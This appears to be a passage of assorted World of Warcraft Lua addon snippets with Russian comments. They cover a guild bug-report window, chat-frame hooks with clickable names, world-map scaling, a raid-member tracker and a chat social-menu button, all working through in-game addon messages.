    -- Кнопка закрытия
    local closeBtn = CreateFrame("Button", nil, frame, "UIPanelButtonTemplate")
    closeBtn:SetWidth(24)
    closeBtn:SetHeight(24)
    closeBtn:SetPoint("TOPRIGHT", -5, -5)
    closeBtn:SetText("X")
    closeBtn:SetScript("OnClick", function(self) self:GetParent():Hide() end)

    -- Кнопка "Загрузить"
    local loadBtn = CreateFrame("Button", nil, frame, "UIPanelButtonTemplate")
    loadBtn:SetWidth(120)
    loadBtn:SetHeight(24)
    loadBtn:SetPoint("TOPLEFT", 15, -15)
    loadBtn:SetText("Загрузить")

    -- Поле ввода
    local inputBox = CreateFrame("EditBox", nil, frame, "InputBoxTemplate")
    inputBox:SetHeight(24)
    inputBox:SetPoint("LEFT", loadBtn, "RIGHT", 10, 0)
    inputBox:SetPoint("RIGHT", closeBtn, "LEFT", -10, 0)
    inputBox:SetAutoFocus(false)
    inputBox:SetMaxLetters(255)
    inputBox:SetText("")
    inputBox:SetScript("OnEscapePressed", function(self) self:ClearFocus() end)

    -- Область вывода с прокруткой
    local listFrame = CreateFrame("ScrollingMessageFrame", "BugReportList", frame)
    listFrame:SetPoint("TOPLEFT", loadBtn, "BOTTOMLEFT", 5, -15)
    listFrame:SetPoint("BOTTOMRIGHT", frame, "BOTTOMRIGHT", -15, 15)
    listFrame:SetFontObject(ChatFontNormal)
    listFrame:SetMaxLines(2000)
    listFrame:SetFading(false)
    listFrame:SetJustifyH("LEFT")
    listFrame:EnableMouse(true)
    listFrame:EnableMouseWheel(true)
    listFrame:SetScript("OnMouseWheel", function(self, delta)
        if delta > 0 then self:ScrollUp() else self:ScrollDown() end
    end)

    -- Счётчик найденных записей
    local counterText = frame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    counterText:SetPoint("TOPLEFT", listFrame, "TOPLEFT", 0, 5)
    counterText:SetText("Найдено: 0")
    _G["BugReportCounterText"] = counterText
    _G["BugReportCount"] = 0

    -- Функция очистки списка
    local function ClearList()
        listFrame:Clear()
        _G["BugReportCount"] = 0
        counterText:SetText("Найдено: 0")
        print("[DEBUG] Список очищен.")
    end

    -- Функция добавления строки с авто-окраской
    local function AddReportLine(text)
        if not text or text == "" then return end

        -- Удаляем все ведущие пробелы, табуляции и невидимые символы
        local cleanText = text:gsub("^%s+", "")
        local firstChar = cleanText:sub(1, 1)

        local colorCode
        if firstChar == "*" then
            colorCode = "|cff00ff00" -- Зелёный
        elseif firstChar == "-" or firstChar == "–" or firstChar == "—" or firstChar == "‐" then
            colorCode = "|cffff0000" -- Красный (учтены все виды дефисов/тире)
        else
            colorCode = "|cffffffff" -- Белый
        end

        listFrame:AddMessage(colorCode .. cleanText .. "|r")

        _G["BugReportCount"] = (_G["BugReportCount"] or 0) + 1
        counterText:SetText("Найдено: " .. _G["BugReportCount"])
    end

    -- Экспорт функции для вызова из обработчика CHAT_MSG_ADDON или очереди
    _G["BugReportAddLine"] = AddReportLine
    print("[DEBUG] Функция _G['BugReportAddLine'] зарегистрирована.")

    -- Функция отправки запроса
    local function SendRequest()
        local msg = inputBox:GetText() or ""
        ClearList()

        local myName = UnitName("player") or "Unknown"
        local queryPayload = "REQ:" .. myName .. "||" .. msg

        SendAddonMessage(BUGS_PREFIX, queryPayload, "GUILD")
        DEFAULT_CHAT_FRAME:AddMessage("|cff00ff00[Bugs]|r Запрос отправлен в гильдию: " .. (msg ~= "" and msg or "(пусто)"))

        inputBox:SetText("")
        inputBox:ClearFocus()
    end

    loadBtn:SetScript("OnClick", SendRequest)
    inputBox:SetScript("OnEnterPressed", function(self)
        SendRequest()
        self:ClearFocus()
    end)

    print("[DEBUG] BugReportFrame успешно создан.")
    return frame
end

-- ==========================================
-- Регистрация команды /bugs
-- ==========================================
SLASH_BUGS1 = "/bugs"
SlashCmdList["BUGS"] = function()
    CreateBugReportFrame():Show()
end
---гитхаб


--- котики
local frame = CreateFrame("Frame")
frame:RegisterEvent("PLAYER_TARGET_CHANGED")
frame:SetScript("OnEvent", function()
    local guid = UnitGUID("target")
    if guid then
        local id = guid:match("0x%x+")
        if id then
            SendAddonMessage("itsCat " .. UnitName("target"), id, "GUILD")
        end
    end
end)
---


















-- ==========================================
-- КЛИЕНТСКИЙ МОДИФИКАТОР ЧАТА (ВСТАВИТЬ В КЛИЕНТСКИЙ АДДОН)
-- ==========================================
local DISPLAY_PREFIX = "\208\144O"

-- Цвет для ника (серебряный)
local NICK_COLOR = "|cFFC0C0C0"
local NICK_COLOR_RESET = "|r"

-- Имена для проверки кликов
local aoNames = {}

-- ==========================================
-- ОБРАБОТЧИК giveMeInfo: ретрансляция из гильдии в рейд
-- ==========================================
local f = CreateFrame("Frame")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript("OnEvent", function(self, event, ...)
    local prefix, text, channel, sender = ...
    
    if prefix == "giveMeInfo" and channel == "GUILD" then
        local nick = text:match("^(%S+)")
        if nick then
            print("Ретрансляция giveMeInfo: " .. nick .. " из GUILD в RAID")
            SendAddonMessage("giveMeInfoR", nick, "RAID")
        end
    end
end)

-- ==========================================
-- Перехватываем AddMessage у КАЖДОГО чат-фрейма
-- ==========================================
local function HookChatFrame(chatFrame)
    if not chatFrame or chatFrame.hookedAO then return end
    chatFrame.hookedAO = true
    
    local oldAddMessage = chatFrame.AddMessage
    chatFrame.AddMessage = function(self, msg, ...)
        if msg and type(msg) == "string" then
            local newMsg = msg:gsub(
                "|Hplayer:[^|]+|h%[[^%]]+%]|h: " .. DISPLAY_PREFIX .. " (%S+):?%s",
                function(targetName)
                    local cleanName = targetName:gsub(":+$", "")
                    aoNames[cleanName] = true
                    
                    -- Кликабельная ссылка, обёрнутая в серебряный цвет
                    local clickableLink = "|Hplayer:" .. cleanName .. "|h" .. NICK_COLOR .. "[" .. cleanName .. "]" .. NICK_COLOR_RESET .. "|h"
                    return "[" .. DISPLAY_PREFIX .. "] " .. clickableLink .. " "
                end
            )
            
            return oldAddMessage(self, newMsg, ...)
        end
        
        return oldAddMessage(self, msg, ...)
    end
end

-- Вешаем хук на существующие чат-фреймы
for i = 1, NUM_CHAT_WINDOWS do
    HookChatFrame(_G["ChatFrame" .. i])
end

-- ==========================================
-- Перехватываем клик по гиперссылке
-- ==========================================
local oldChatFrame_OnHyperlinkShow = ChatFrame_OnHyperlinkShow
ChatFrame_OnHyperlinkShow = function(self, link, text, button)
    local linkType, linkData = link:match("^(%a+):(.+)$")
    
    if linkType == "player" and linkData then
        local name = linkData:match("^([^:]+)")
        
        if name and aoNames[name] then
            if button == "RightButton" then
                -- ПКМ: отправляем запрос в гильдию
                print("Отправка giveMeInfo в GUILD: " .. name)
                SendAddonMessage("giveMeInfo", name, "GUILD")
                return
            elseif button == "LeftButton" then
                -- ЛКМ: вставляем имя в поле ввода
                local editBox = self.editBox
                if not editBox then
                    editBox = ChatFrame1EditBox
                end
                
                if not editBox:IsShown() then
                    editBox:Show()
                end
                editBox:Insert(name .. ", ")
                editBox:SetFocus()
                return
            end
        end
    end
    
    return oldChatFrame_OnHyperlinkShow(self, link, text, button)
end

























function HookWorldMapCloseButton()
    local btn = WorldMapFrameCloseButton
    if not btn then
        local f = CreateFrame("Frame")
        f:SetScript("OnUpdate", function(self, elapsed)
            if WorldMapFrameCloseButton then
                self:SetScript("OnUpdate", nil)
                HookWorldMapCloseButton()
            end
        end)
        return
    end

    -- Регистрируем клики: ЛКМ, ПКМ, колесо
    btn:RegisterForClicks("LeftButtonUp", "RightButtonDown", "MiddleButtonUp")

    -- Создаём тултип (один раз)
    local tooltip = CreateFrame("GameTooltip", "WorldMapCloseButtonTooltip", UIParent, "GameTooltipTemplate")

    btn:SetScript("OnEnter", function(self)
        tooltip:SetOwner(self, "ANCHOR_TOPLEFT", 0, 10)
        tooltip:ClearLines()
        tooltip:AddLine("Управление картой мира:", 1, 1, 0)
        tooltip:AddLine("• ЛКМ — закрыть карту", 1, 1, 1)
        tooltip:AddLine("• ПКМ — активировать перемещение", 1, 1, 1)
        tooltip:AddLine("• Колесо мыши — выбрать масштаб", 1, 1, 1)
        tooltip:Show()
    end)

    btn:SetScript("OnLeave", function(self)
        tooltip:Hide()
    end)

    local oldOnClick = btn:GetScript("OnClick")

    -- Масштабы от 50% до 150% с шагом 10%
    local scaleSteps = { 0.5, 0.6, 0.7, 0.8, 0.9, 1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0 }
    local currentScaleIndex = 6 -- по умолчанию 100% (индекс 6)

    -- Создаём выпадающее меню
    local dropdown = CreateFrame("Frame", "WorldMapScaleDropdown", UIParent, "UIDropDownMenuTemplate")
    dropdown.displayMode = "MENU"

    local function OnScaleSelected(self)
        local w = WorldMapFrame
        if not w then return end
        currentScaleIndex = self.value
        w:SetScale(scaleSteps[currentScaleIndex])
        CloseDropDownMenus()
    end

    local function InitializeScaleMenu(self, level)
        for i, scale in ipairs(scaleSteps) do
            local info = UIDropDownMenu_CreateInfo()
            info.text = math.floor(scale * 100) .. "%"
            info.value = i
            info.func = OnScaleSelected
            info.checked = (i == currentScaleIndex)
            UIDropDownMenu_AddButton(info, level)
        end
    end

    UIDropDownMenu_Initialize(dropdown, InitializeScaleMenu, "MENU")

    btn:SetScript("OnClick", function(self, button)
        local w = WorldMapFrame
        if not w then return end

        if button == "RightButton" then
            w:SetMovable(true)
            w:EnableMouse(true)
            w:SetClampedToScreen(true)
            w:SetScript("OnMouseDown", function(frame, btn)
                if btn == "LeftButton" then
                    frame:StartMoving()
                end
            end)
            w:SetScript("OnMouseUp", function(frame, btn)
                if btn == "LeftButton" then
                    frame:StopMovingOrSizing()
                end
            end)

        elseif button == "MiddleButton" then
            -- Показываем выпадающее меню у курсора
            ToggleDropDownMenu(1, nil, dropdown, "cursor", 0, 0)

        else
            if type(oldOnClick) == "function" then
                oldOnClick(self, button)
            else
                HideUIPanel(w)
            end
        end
    end)
end









local raidTracker = CreateFrame("Frame")
raidTracker:RegisterEvent("GROUP_ROSTER_UPDATE")
raidTracker:RegisterEvent("RAID_ROSTER_UPDATE")
raidTracker:RegisterEvent("PARTY_MEMBERS_CHANGED")
raidTracker:RegisterEvent("PLAYER_ENTERING_WORLD")
raidTracker:RegisterEvent("ADDON_LOADED")

local wasInRaid = IsInRaid()
local raidMembers = {}
local nsqc3Handled = false

local function GetCurrentRaidMembers()
    local members = {}
    if IsInRaid() then
        for i = 1, GetNumRaidMembers() do
            local name = GetRaidRosterInfo(i)
            if name then
                local plainName = name:match("^(.-)-") or name
                members[plainName] = true
            end
        end
    end
    return members
end

local function GetGuildMemberSet()
    local guild = {}
    for i = 1, GetNumGuildMembers() do
        local name = GetGuildRosterInfo(i)
        if name then
            local plainName = name:match("^(.-)-") or name
            guild[plainName] = true
        end
    end
    return guild
end

local function RequestGPWithDelay(memberSet)
    local guildSet = GetGuildMemberSet()
    local nicks = {}
    for plainName in pairs(memberSet) do
        if not guildSet[plainName] then
            table.insert(nicks, plainName)
        end
    end
    if #nicks == 0 then return end

    local timerFrame = CreateFrame("Frame")
    local elapsed = 0
    local delay = 0.05
    local currentIndex = 1

    timerFrame:SetScript("OnUpdate", function(frame, dt)
        elapsed = elapsed + dt
        if elapsed >= delay then
            elapsed = 0
            if currentIndex <= #nicks then
                SendAddonMessage("GetGPA", nicks[currentIndex], "GUILD")
                currentIndex = currentIndex + 1
            else
                frame:SetScript("OnUpdate", nil)
                frame:Hide()
            end
        end
    end)
end

local function RequestGPWithRetry(attempt)
    attempt = attempt or 1
    local maxAttempts = 10

    local memberSet = GetCurrentRaidMembers()
    local memberCount = 0
    for _ in pairs(memberSet) do memberCount = memberCount + 1 end

    if memberCount == 0 and attempt < maxAttempts then
        local timerFrame = CreateFrame("Frame")
        local elapsed = 0
        local delay = 1.0

        timerFrame:SetScript("OnUpdate", function(frame, dt)
            elapsed = elapsed + dt
            if elapsed >= delay then
                frame:SetScript("OnUpdate", nil)
                frame:Hide()
                RequestGPWithRetry(attempt + 1)
            end
        end)
    elseif memberCount > 0 then
        raidMembers = memberSet
        RequestGPWithDelay(memberSet)
    end
end

local function HandleNSQC3Loaded()
    if nsqc3Handled then return end
    nsqc3Handled = true

    if not IsInRaid() then return end

    local timerFrame = CreateFrame("Frame")
    local elapsed = 0
    local delay = 2.0

    timerFrame:SetScript("OnUpdate", function(frame, dt)
        elapsed = elapsed + dt
        if elapsed >= delay then
            frame:SetScript("OnUpdate", nil)
            frame:Hide()
            if IsInRaid() and IsInGuild() and GetNumGuildMembers() > 0 then
                RequestGPWithRetry(1)
            end
        end
    end)
end

-- === СТРАХОВКА С ОТЛАДКОЙ ===
if IsAddOnLoaded("NSQC3") then
    print("|cFFFF0000[GP]|r NSQC3 уже загружен при инициализации")
    nsqc3Handled = true
    if IsInRaid() then
        print("|cFFFF0000[GP]|r Мы в рейде, запускаем таймер 2с")
        local timerFrame = CreateFrame("Frame")
        local elapsed = 0
        timerFrame:SetScript("OnUpdate", function(frame, dt)
            elapsed = elapsed + dt
            if elapsed >= 2.0 then
                frame:SetScript("OnUpdate", nil)
                frame:Hide()
                print("|cFFFF0000[GP]|r Таймер 2с сработал. IsInRaid:", tostring(IsInRaid()),
                      "IsInGuild:", tostring(IsInGuild()),
                      "GetNumGuildMembers:", tostring(GetNumGuildMembers()))
                if IsInRaid() and IsInGuild() and GetNumGuildMembers() > 0 then
                    print("|cFFFF0000[GP]|r Условия выполнены, запускаем RequestGPWithRetry")
                    RequestGPWithRetry(1)
                else
                    print("|cFFFF0000[GP]|r Условия НЕ выполнены")
                end
            end
        end)
    else
        print("|cFFFF0000[GP]|r Не в рейде")
    end
end
-- ============================

print("|cFFFF0000[GP]|r Трекер инициализирован. wasInRaid:", tostring(wasInRaid), "nsqc3Handled:", tostring(nsqc3Handled))

raidMembers = GetCurrentRaidMembers()

raidTracker:SetScript("OnEvent", function(_, event, ...)
    local isInRaid = IsInRaid()

    if event == "ADDON_LOADED" and not nsqc3Handled then
        local addonName = ...
        if addonName == "NSQC3" then
            HandleNSQC3Loaded()
        end
        return
    end

    if event == "PLAYER_ENTERING_WORLD" and not nsqc3Handled then
        local loaded, finished = IsAddOnLoaded("NSQC3")
        if loaded and finished then
            HandleNSQC3Loaded()
        end
        return
    end

    if isInRaid and not wasInRaid then
        print("|cFFFF0000[GP]|r Рейд создан")
        RequestGPWithRetry(1)
        wasInRaid = true
        return
    end

    if isInRaid and wasInRaid then
        local newMembers = GetCurrentRaidMembers()
        local guildSet = GetGuildMemberSet()

        local newNonGuildNicks = {}
        for plainName in pairs(newMembers) do
            if not raidMembers[plainName] then
                if not guildSet[plainName] then
                    table.insert(newNonGuildNicks, plainName)
                end
            end
        end

        if #newNonGuildNicks > 0 then
            local timerFrame = CreateFrame("Frame")
            local elapsed = 0
            local delay = 0.05
            local currentIndex = 1

            timerFrame:SetScript("OnUpdate", function(frame, dt)
                elapsed = elapsed + dt
                if elapsed >= delay then
                    elapsed = 0
                    if currentIndex <= #newNonGuildNicks then
                        SendAddonMessage("GetGPA", newNonGuildNicks[currentIndex], "GUILD")
                        currentIndex = currentIndex + 1
                    else
                        frame:SetScript("OnUpdate", nil)
                        frame:Hide()
                    end
                end
            end)
        end

        raidMembers = newMembers
    end

    wasInRaid = isInRaid
end)











-- Таблица настроек (должна быть определена глобально)
if not nsDbc then nsDbc = {} end
if not nsDbc["сохранения чата"] then 
    nsDbc["сохранения чата"] = {}
end

-- Кэш настроек для быстрого доступа
local cachedSettings = {
    showChatColor = true,
    openGuildChat = false
}

-- Инициализируем кэш из сохраненных настроек
if nsDbc["сохранения чата"].showChatColor ~= nil then
    cachedSettings.showChatColor = nsDbc["сохранения чата"].showChatColor
end
if nsDbc["сохранения чата"].openGuildChat ~= nil then
    cachedSettings.openGuildChat = nsDbc["сохранения чата"].openGuildChat
end

local function GetCurrentChatFrame()
    -- Получаем текущую активную вкладку чата
    for i = 1, NUM_CHAT_WINDOWS do
        local tab = _G["ChatFrame"..i.."Tab"]
        local frame = _G["ChatFrame"..i]
        if tab and frame and frame:IsShown() then
            local name = tab:GetName()
            local selectedMiddle = _G[name.."SelectedMiddle"]
            
            -- Активная вкладка имеет видимую текстуру SelectedMiddle
            if selectedMiddle and selectedMiddle:IsShown() then
                return frame
            end
        end
    end
    -- Если не нашли активную, возвращаем первый чат
    return ChatFrame1
end

local function CreateChatMenuButton(frame)
    if not frame then return end
    if frame.menuButton then return end
    
    -- Кнопка "Общение" - главная
    local socialBtn = CreateFrame("Button", nil, frame, "SecureActionButtonTemplate")
    socialBtn:SetSize(24, 24)
    socialBtn:SetPoint("TOPLEFT", frame, "TOPLEFT", -2, 22)
    socialBtn:EnableMouse(true)
    socialBtn:RegisterForClicks("LeftButtonUp", "RightButtonUp", "MiddleButtonUp")
    socialBtn:SetFrameStrata("FULLSCREEN")
    
    -- Backdrop всегда черный
    socialBtn:SetBackdrop({
        bgFile = "Interface\\Tooltips\\UI-Tooltip-Background",
        edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border",
        tile = true, tileSize = 16, edgeSize = 16,
        insets = { left = 4, right = 4, top = 4, bottom = 4 }
    })
    socialBtn:SetBackdropColor(0, 0, 0, 1)
    socialBtn:SetBackdropBorderColor(0, 0, 0, 1)
    
    -- Текст с количеством друзей онлайн
    local socialText = socialBtn:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    socialText:SetPoint("CENTER", socialBtn, "CENTER")
    socialText:SetFont("Fonts\\FRIZQT__.TTF", 12, "THICKOUTLINE")
    socialText:SetTextColor(1, 1, 1, 1) -- По умолчанию белый
    socialText:SetText("0")
    
    -- Храним последний тип чата
    local lastChatType = "default"
    
    -- Функция обновления текста
    local function UpdateSocialCount()
        local _, online = GetNumFriends()
        socialText:SetText(online or 0)
    end
    
    -- Функция установки цвета текста по типу чата (использует кэш)
    local function SetTextColor(chatType)
        if not cachedSettings.showChatColor then
            socialText:SetTextColor(0, 1, 0, 1) -- Зеленый по умолчанию если опция выключена
            return
        end
        
        if chatType == "guild" then
            socialText:SetTextColor(0, 1, 0, 1) -- Зеленый - гильдия
        elseif chatType == "raid" then
            socialText:SetTextColor(1, 0.5, 0, 1) -- Оранжевый - рейд
        elseif chatType == "party" then
            socialText:SetTextColor(0.3, 0.5, 1, 1) -- Синий - группа
        elseif chatType == "say" then
            socialText:SetTextColor(1, 1, 1, 1) -- Белый - общий
        else
            socialText:SetTextColor(1, 1, 1, 1) -- Белый - по умолчанию
        end
        
        lastChatType = chatType
    end
    
    -- Переменная для отслеживания состояния видимости кнопок
    local buttonsVisible = false
    
    -- Кнопка меню (облачко)
    local button = CreateFrame("Button", nil, frame)
    button:SetSize(20, 20)
    button:SetPoint("TOPLEFT", frame, "TOPLEFT", -2, -2)
    button:SetNormalTexture("Interface\\ChatFrame\\UI-ChatIcon-Chat-Up")
    button:SetPushedTexture("Interface\\ChatFrame\\UI-ChatIcon-Chat-Down")
    button:SetHighlightTexture("Interface\\Buttons\\UI-Common-MouseHilight")
    button:SetScript("OnClick", function(self, mouseButton)
        if mouseButton == "LeftButton" then
            ChatFrameMenuButton:Click()
        end
    end)
    button:Hide()
    
    -- Кнопка "Вниз" (прокрутка)
    local downBtn = CreateFrame("Button", nil, frame)
    downBtn:SetSize(20, 20)
    downBtn:SetPoint("TOPLEFT", frame, "TOPLEFT", -2, -24)
    downBtn:SetNormalTexture("Interface\\ChatFrame\\UI-ChatIcon-ScrollEnd-Up")
    downBtn:SetPushedTexture("Interface\\ChatFrame\\UI-ChatIcon-ScrollEnd-Down")
    downBtn:SetHighlightTexture("Interface\\Buttons\\UI-Common-MouseHilight")
    downBtn:SetScript("OnClick", function(self, mouseButton)
        if mouseButton == "LeftButton" then
            local currentFrame = GetCurrentChatFrame()
            if currentFrame then
                currentFrame:ScrollToBottom()
            end
        end
    end)
    downBtn:Hide()
    
    -- Кнопка настроек
    local settingsBtn = CreateFrame("Button", nil, frame)
    settingsBtn:SetSize(20, 20)
    settingsBtn:SetPoint("BOTTOM", socialBtn, "TOP", 0, 2)
    settingsBtn:SetNormalTexture("Interface\\Buttons\\UI-OptionsButton")
    settingsBtn:SetHighlightTexture("Interface\\Buttons\\UI-Common-MouseHilight")
    
    -- Текст * на кнопке настроек
    local settingsBtnText = settingsBtn:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    settingsBtnText:SetPoint("CENTER", settingsBtn, "CENTER")
    settingsBtnText:SetFont("Fonts\\FRIZQT__.TTF", 14, "THICKOUTLINE")
    settingsBtnText:SetTextColor(1, 1, 1, 1)
    settingsBtnText:SetText("*")
    settingsBtn:Hide()
    
    settingsBtn:SetScript("OnClick", function(self, mouseButton)
        if mouseButton == "LeftButton" then
            ToggleSettingsPanel()
        end
    end)
    
    -- Создание панели настроек
    local settingsPanel = CreateFrame("Frame", nil, UIParent)
    settingsPanel:SetSize(330, 130)
    settingsPanel:SetPoint("CENTER", UIParent, "CENTER")
    settingsPanel:SetBackdrop({
        bgFile = "Interface\\Tooltips\\UI-Tooltip-Background",
        edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border",
        tile = true, tileSize = 16, edgeSize = 16,
        insets = { left = 4, right = 4, top = 4, bottom = 4 }
    })
    settingsPanel:SetBackdropColor(0, 0, 0, 0.8)
    settingsPanel:SetMovable(true)
    settingsPanel:EnableMouse(true)
    settingsPanel:SetClampedToScreen(true)
    settingsPanel:Hide()
    
    -- Заголовок
    local title = settingsPanel:CreateFontString(nil, "OVERLAY", "GameFontNormalLarge")
    title:SetPoint("TOP", settingsPanel, "TOP", 0, -15)
    title:SetText("Настройки чата")
    
    -- Кнопка закрытия
    local closeBtn = CreateFrame("Button", nil, settingsPanel, "UIPanelCloseButton")
    closeBtn:SetPoint("TOPRIGHT", settingsPanel, "TOPRIGHT", -2, -2)
    
    -- Чекбокс "Открывать гильдчат при входе"
    local guildChatCheckbox = CreateFrame("CheckButton", nil, settingsPanel, "UICheckButtonTemplate")
    guildChatCheckbox:SetPoint("TOPLEFT", settingsPanel, "TOPLEFT", 15, -40)
    guildChatCheckbox:SetSize(26, 26)
    
    local checkboxText = guildChatCheckbox:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    checkboxText:SetPoint("LEFT", guildChatCheckbox, "RIGHT", 5, 0)
    checkboxText:SetText("Открывать гильдчат при входе в игру")
    
    -- Чекбокс "Отображать текущий чат цветом"
    local colorChatCheckbox = CreateFrame("CheckButton", nil, settingsPanel, "UICheckButtonTemplate")
    colorChatCheckbox:SetPoint("TOPLEFT", guildChatCheckbox, "BOTTOMLEFT", 0, -10)
    colorChatCheckbox:SetSize(26, 26)
    
    local colorCheckboxText = colorChatCheckbox:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    colorCheckboxText:SetPoint("LEFT", colorChatCheckbox, "RIGHT", 5, 0)
    colorCheckboxText:SetText("Отображать текущий чат цветом")
    
    -- Функция обновления чекбоксов из кэша
    local function UpdateCheckboxes()
        guildChatCheckbox:SetChecked(cachedSettings.openGuildChat)
        colorChatCheckbox:SetChecked(cachedSettings.showChatColor)
    end
    
    guildChatCheckbox:SetScript("OnClick", function(self)
        cachedSettings.openGuildChat = self:GetChecked()
        if not nsDbc["сохранения чата"] then
            nsDbc["сохранения чата"] = {}
        end
        nsDbc["сохранения чата"].openGuildChat = cachedSettings.openGuildChat
    end)
    
    colorChatCheckbox:SetScript("OnClick", function(self)
        cachedSettings.showChatColor = self:GetChecked()
        if not nsDbc["сохранения чата"] then
            nsDbc["сохранения чата"] = {}
        end
        nsDbc["сохранения чата"].showChatColor = cachedSettings.showChatColor
        -- Обновляем цвет текста на всех кнопках
        for i = 1, NUM_CHAT_WINDOWS do
            local f = _G["ChatFrame"..i]
            if f and f.socialButton and f.socialButton.UpdateColor then
                f.socialButton.UpdateColor()
            end
        end
    end)
    
    -- Функция перетаскивания для панели
    settingsPanel:SetScript("OnMouseDown", function(self, button)
        if button == "LeftButton" then
            self:StartMoving()
        end
    end)
    
    settingsPanel:SetScript("OnMouseUp", function(self, button)
        if button == "LeftButton" then
            self:StopMovingOrSizing()
        end
    end)
    
    -- Функция показа/скрытия панели настроек
    function ToggleSettingsPanel()
        if settingsPanel:IsShown() then
            settingsPanel:Hide()
        else
            UpdateCheckboxes()
            settingsPanel:Show()
        end
    end
    
    -- Функция показа/скрытия кнопок
    local function ToggleButtons()
        buttonsVisible = not buttonsVisible
        if buttonsVisible then
            button:Show()
            downBtn:Show()
            settingsBtn:Show()
        else
            button:Hide()
            downBtn:Hide()
            settingsBtn:Hide()
        end
    end
    
    -- Переменные для отслеживания даблклика ПКМ
    local lastRightClickTime = 0
    local rightDoubleClickDetected = false
    local rightClickResetTimer = 0
    
    -- Скрипты для кнопки "Общение"
    socialBtn:SetScript("OnMouseDown", function(self, mouseButton)
        if mouseButton == "RightButton" then
            local currentTime = GetTime()
            
            -- Проверяем время между правыми кликами
            if (currentTime - lastRightClickTime) < 0.3 then -- 300ms
                rightDoubleClickDetected = true
                rightClickResetTimer = 0
                
                -- Открываем общий чат /с в текущей вкладке
                local currentFrame = GetCurrentChatFrame()
                if currentFrame and currentFrame.editBox then
                    currentFrame.editBox:SetText("/с ")
                    currentFrame.editBox:SetFocus()
                    currentFrame.editBox:HighlightText()
                    SetTextColor("say")
                end
            else
                rightClickResetTimer = 0.3
            end
            
            lastRightClickTime = currentTime
        end
    end)
    
    -- Фрейм для обновления таймера сброса
    local timerFrame = CreateFrame("Frame", nil, socialBtn)
    timerFrame:SetScript("OnUpdate", function(self, elapsed)
        if rightClickResetTimer > 0 then
            rightClickResetTimer = rightClickResetTimer - elapsed
            if rightClickResetTimer <= 0 then
                lastRightClickTime = 0
                rightClickResetTimer = 0
            end
        end
    end)
    
    socialBtn:SetScript("OnClick", function(self, mouseButton)
        -- Игнорируем клик если был даблклик ПКМ
        if rightDoubleClickDetected then
            rightDoubleClickDetected = false
            return
        end
        
        if mouseButton == "LeftButton" then
            if IsShiftKeyDown() then
                -- Shift+ЛКМ - групповой чат
                local currentFrame = GetCurrentChatFrame()
                if currentFrame and currentFrame.editBox then
                    currentFrame.editBox:SetText("/p ")
                    currentFrame.editBox:SetFocus()
                    currentFrame.editBox:HighlightText()
                    SetTextColor("party")
                end
            else
                -- Обычный ЛКМ - друзья
                if FriendsMicroButton then
                    FriendsMicroButton:Click()
                end
            end
        elseif mouseButton == "RightButton" then
            if IsShiftKeyDown() then
                -- Shift+ПКМ - рейдовый чат
                local currentFrame = GetCurrentChatFrame()
                if currentFrame and currentFrame.editBox then
                    currentFrame.editBox:SetText("/ra ")
                    currentFrame.editBox:SetFocus()
                    currentFrame.editBox:HighlightText()
                    SetTextColor("raid")
                end
            else
                ToggleButtons()
            end
        elseif mouseButton == "MiddleButton" then
            -- Колесо мыши - гильдчат
            local currentFrame = GetCurrentChatFrame()
            if currentFrame and currentFrame.editBox then
                currentFrame.editBox:SetText("/g ")
                currentFrame.editBox:SetFocus()
                currentFrame.editBox:HighlightText()
                SetTextColor("guild")
            end
        end
    end)
    
    -- Тултип для кнопки
    socialBtn:SetScript("OnEnter", function(self)
        GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
        GameTooltip:SetText("Меню общения", 1, 1, 1)
        GameTooltip:AddLine(" ")
        GameTooltip:AddLine("|cff00ff00ЛКМ|r - Список друзей", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff00ff00Shift+ЛКМ|r - Групповой чат |cff8888ff(/p)|r", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff00ff00ПКМ|r - Показать/скрыть меню", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff00ff00Даблклик ПКМ|r - Общий чат |cff8888ff(/с)|r", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff00ff00Shift+ПКМ|r - Рейдовый чат |cff8888ff(/ra)|r", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff00ff00Колесо мыши|r - Гильдчат |cff8888ff(/g)|r", 0.9, 0.9, 0.9)
        GameTooltip:AddLine(" ")
        GameTooltip:AddLine("Цвет текста показывает последний чат:", 1, 0.8, 0)
        GameTooltip:AddLine("|cff00ff00Зеленый|r - Гильдия", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cffFF8000Оранжевый|r - Рейд", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cff4D80FFСиний|r - Группа", 0.9, 0.9, 0.9)
        GameTooltip:AddLine("|cffFFFFFFБелый|r - Общий", 0.9, 0.9, 0.9)
        GameTooltip:Show()
    end)
    
    socialBtn:SetScript("OnLeave", function(self)
        GameTooltip:Hide()
    end)
    
    -- Задержка 3 секунды только для первого входа и загрузки настроек
    local enterWorldDelay = 0
    local enterWorldCheck = false
    
    -- Отдельный фрейм для событий
    local eventFrame = CreateFrame("Frame", nil, socialBtn)
    eventFrame:SetScript("OnEvent", function(self, event, ...)
        if event == "FRIENDLIST_UPDATE" then
            UpdateSocialCount()
        elseif event == "PLAYER_ENTERING_WORLD" then
            UpdateSocialCount()
            enterWorldDelay = 3
            enterWorldCheck = true
        end
    end)
    
    eventFrame:SetScript("OnUpdate", function(self, elapsed)
        if enterWorldCheck then
            enterWorldDelay = enterWorldDelay - elapsed
            if enterWorldDelay <= 0 then
                enterWorldCheck = false
                
                -- Обновляем кэш из сохраненных настроек
                if not nsDbc["сохранения чата"] then
                    nsDbc["сохранения чата"] = {}
                end
                
                if nsDbc["сохранения чата"].showChatColor ~= nil then
                    cachedSettings.showChatColor = nsDbc["сохранения чата"].showChatColor
                end
                if nsDbc["сохранения чата"].openGuildChat ~= nil then
                    cachedSettings.openGuildChat = nsDbc["сохранения чата"].openGuildChat
                end
                
                -- Проверяем настройку открытия гильдчата
                if cachedSettings.openGuildChat then
